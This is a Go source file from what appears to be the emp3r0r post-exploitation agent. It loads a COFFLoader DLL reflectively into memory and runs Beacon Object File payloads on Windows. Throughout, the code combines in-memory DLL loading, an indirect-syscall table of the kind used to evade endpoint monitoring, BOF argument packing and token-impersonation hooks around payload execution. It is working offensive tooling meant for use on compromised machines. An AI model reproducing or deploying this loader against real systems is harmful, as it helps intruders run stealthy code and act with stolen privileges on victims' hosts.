//go:build windows

package coffloader

import (
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"runtime"
	"strconv"
	"unicode/utf16"
	"unsafe"

	"github.com/jm33-m0/emp3r0r/core/lib/memmod"
	ntsyscall "github.com/jm33-m0/emp3r0r/core/lib/syscall"
	"golang.org/x/sys/windows"
)

// RunWindowsCOFFViaDLL loads the COFFLoader DLL in memory with memmod and runs
// one BOF through its exported LoadAndRun function. The DLL is unloaded again
// as soon as the BOF returns; the DLL bytes themselves are expected to stay
// cached in memfs by the caller so they can be re-loaded on demand.
func RunWindowsCOFFViaDLL(dllData, payload []byte, entry string, args []CoffArg, token uintptr) (out string, err error) {
	defer func() {
		if r := recover(); r != nil {
			err = fmt.Errorf("RunWindowsCOFFViaDLL panic: %v", r)
			out = ""
		}
	}()

	if runtime.GOARCH != "amd64" && runtime.GOARCH != "386" {
		return "", fmt.Errorf("in-memory DLL COFF loading is not supported on %s", runtime.GOARCH)
	}
	if len(dllData) == 0 {
		return "", fmt.Errorf("empty COFFLoader DLL")
	}
	if len(payload) == 0 {
		return "", fmt.Errorf("empty COFF payload")
	}
	if entry == "" {
		entry = "go"
	}

	if err = ensureSyscallTable(); err != nil {
		return "", fmt.Errorf("initializing syscall table: %w", err)
	}

	bofArgs, err := packBOFArgs(args)
	if err != nil {
		return "", err
	}

	buf := buildLoadAndRunBuffer(entry, payload, bofArgs)

	module, err := memmod.LoadLibrary(dllData)
	if err != nil {
		return "", fmt.Errorf("loading COFFLoader DLL: %w", err)
	}
	defer module.Free()

	loadAndRun, err := module.ProcAddressByName("LoadAndRun")
	if err != nil {
		return "", fmt.Errorf("resolving LoadAndRun: %w", err)
	}
	if loadAndRun == 0 {
		return "", fmt.Errorf("LoadAndRun address is 0")
	}

	var output []byte
	callback := windows.NewCallbackCDecl(func(data uintptr, size int32) uintptr {
		if data != 0 && size > 0 {
			output = append(output, unsafe.Slice((*byte)(unsafe.Pointer(data)), int(size))...)
		}
		return 0
	})

	// The BOF runs inside LoadAndRun on this OS thread. Impersonate around it
	// exactly like the pure-Go COFF loader did for its BOF goroutine.
	if token != 0 && PreExecHook != nil {
		PreExecHook(token)
		defer func() {
			if PostExecHook != nil {
				PostExecHook()
			}
		}()
	}

	r0 := callLoadAndRun(loadAndRun, buf, callback)
	if ret := int32(uint32(r0)); ret != 0 {
		return string(output), fmt.Errorf("LoadAndRun returned %d", ret)
	}

	return string(output), nil
}

// ensureSyscallTable initializes the global indirect-syscall table used by
// memmod if it has not been set up yet (the agent normally initializes it at
// startup).
func ensureSyscallTable() error {
	if ntsyscall.RuntimeSyscallTable != nil {
		return nil
	}
	table, err := ntsyscall.InitializeSyscallTable()
	if err != nil {
		return err
	}
	ntsyscall.RuntimeSyscallTable = table
	return nil
}

// buildLoadAndRunBuffer builds the buffer expected by COFFLoader's
// LoadAndRun export:
//
//	[4-byte header] [entry name] [coff data] [bof args]
//
// Each component is length-prefixed (BeaconDataExtract format).
func buildLoadAndRunBuffer(entry string, coff, bofArgs []byte) []byte {
	buf := make([]byte, 4) // skipped by BeaconDataParse
	// The entry name must be padded to a 4-byte boundary: the C loader casts
	// the extracted COFF blob to naturally aligned structs (coff_file_header_t
	// etc.), so the COFF data pointer that follows the entry must stay 4-byte
	// aligned. An unaligned pointer is UB and trips the UB alignment traps that
	// sanitizer/debug builds (e.g. zig cc's default Debug mode) emit, raising
	// STATUS_ILLEGAL_INSTRUCTION (0xc000001d).
	buf = append(buf, packCStringAligned(entry)...)
	buf = append(buf, packBlob(coff)...)
	buf = append(buf, packBlob(bofArgs)...)
	return buf
}

// packBOFArgs packs resolved COFF args into the BOF argument buffer:
// a 4-byte total length followed by each typed argument. It follows the
// COFFLoader beacon_generate.py argument format directly.
func packBOFArgs(args []CoffArg) ([]byte, error) {
	var body []byte
	for _, arg := range args {
		packed, err := packOneArg(arg)
		if err != nil {
			return nil, err
		}
		body = append(body, packed...)
	}
	out := make([]byte, 4)
	binary.LittleEndian.PutUint32(out, uint32(len(body)))
	return append(out, body...), nil
}

// packOneArg packs a single CoffArg according to its wire type.
func packOneArg(arg CoffArg) ([]byte, error) {
	switch normalizeWireType(arg.WireType) {
	case "z":
		s := coerceString(arg.Value)
		return packCString(s), nil
	case "Z":
		s := coerceString(arg.Value)
		wide := utf16Bytes(s)
		// COFFLoader's addWstr packs a NUL-terminated wide string and
		// includes the 2-byte terminator in the length prefix.
		wide = append(wide, 0, 0)
		return packBlob(wide), nil
	case "i":
		v, err := coerceUint32(arg.Value)
		if err != nil {
			return nil, err
		}
		buf := make([]byte, 4)
		binary.LittleEndian.PutUint32(buf, v)
		return buf, nil
	case "s":
		v, err := coerceUint16(arg.Value)
		if err != nil {
			return nil, err
		}
		buf := make([]byte, 2)
		binary.LittleEndian.PutUint16(buf, v)
		return buf, nil
	case "b":
		data, err := coerceBinary(arg.Value)
		if err != nil {
			return nil, err
		}
		return packBlob(data), nil
	default:
		return nil, fmt.Errorf("unsupported COFF wire type %q", arg.WireType)
	}
}

// normalizeWireType maps the resolved single-char tokens and the full type
// names to the canonical tokens z/Z/i/s/b.
func normalizeWireType(t string) string {
	switch t {
	case "z", "lpstr", "cstr", "string", "S":
		return "z"
	case "Z", "lpwstr", "wstring", "wstr", "w":
		return "Z"
	case "i", "int", "dword", "uint", "uint32", "int32", "port", "bool", "qword", "size_t", "handle":
		return "i"
	case "s", "short", "word", "int16":
		return "s"
	case "b", "binary", "base64":
		return "b"
	default:
		return t
	}
}

// packBlob returns a 4-byte little-endian length followed by data.
func packBlob(data []byte) []byte {
	out := make([]byte, 4)
	binary.LittleEndian.PutUint32(out, uint32(len(data)))
	return append(out, data...)
}

// packCString returns a length-prefixed, NUL-terminated C string.
func packCString(s string) []byte {
	return packBlob(append([]byte(s), 0))
}

// packCStringAligned packs a NUL-terminated C string padded with extra NUL
// bytes so its length-prefixed payload is a multiple of 4 bytes. The C side
// only consumes it as a NUL-terminated string, so the padding is harmless and
// keeps the next length-prefixed blob 4-byte aligned.
func packCStringAligned(s string) []byte {
	raw := append([]byte(s), 0)
	data := make([]byte, (len(raw)+3)&^3)
	copy(data, raw)
	return packBlob(data)
}

// utf16Bytes encodes s as UTF-16LE without a NUL terminator.
func utf16Bytes(s string) []byte {
	u := utf16.Encode([]rune(s))
	buf := make([]byte, len(u)*2)
	for i, r := range u {
		binary.LittleEndian.PutUint16(buf[i*2:], r)
	}
	return buf
}

func coerceString(v any) string {
	if v == nil {
		return ""
	}
	return fmt.Sprint(v)
}

func coerceUint32(v any) (uint32, error) {
	switch x := v.(type) {
	case int:
		return uint32(x), nil
	case int32:
		return uint32(x), nil
	case int64:
		return uint32(x), nil
	case uint:
		return uint32(x), nil
	case uint32:
		return x, nil
	case uint64:
		return uint32(x), nil
	case float64:
		return uint32(x), nil
	case bool:
		if x {
			return 1, nil
		}
		return 0, nil
	case string:
		n, err := strconv.ParseUint(x, 10, 32)
		if err == nil {
			return uint32(n), nil
		}
		sn, serr := strconv.ParseInt(x, 10, 32)
		if serr != nil {
			return 0, fmt.Errorf("invalid int value %q", x)
		}
		return uint32(sn), nil
	}
	return 0, fmt.Errorf("invalid int value %v", v)
}

func coerceUint16(v any) (uint16, error) {
	switch x := v.(type) {
	case int:
		return uint16(x), nil
	case int16:
		return uint16(x), nil
	case int32:
		return uint16(x), nil
	case int64:
		return uint16(x), nil
	case uint:
		return uint16(x), nil
	case uint16:
		return x, nil
	case uint32:
		return uint16(x), nil
	case uint64:
		return uint16(x), nil
	case float64:
		return uint16(x), nil
	case string:
		n, err := strconv.ParseUint(x, 10, 16)
		if err != nil {
			return 0, fmt.Errorf("invalid short value %q", x)
		}
		return uint16(n), nil
	}
	return 0, fmt.Errorf("invalid short value %v", v)
}

func coerceBinary(v any) ([]byte, error) {
	switch x := v.(type) {
	case []byte:
		return x, nil
	case string:
		if decoded, err := base64.StdEncoding.DecodeString(x); err == nil {
			return decoded, nil
		}
		if decoded, err := hex.DecodeString(x); err == nil {
			return decoded, nil
		}
		return []byte(x), nil
	}
	return nil, fmt.Errorf("invalid binary value %v", v)
}
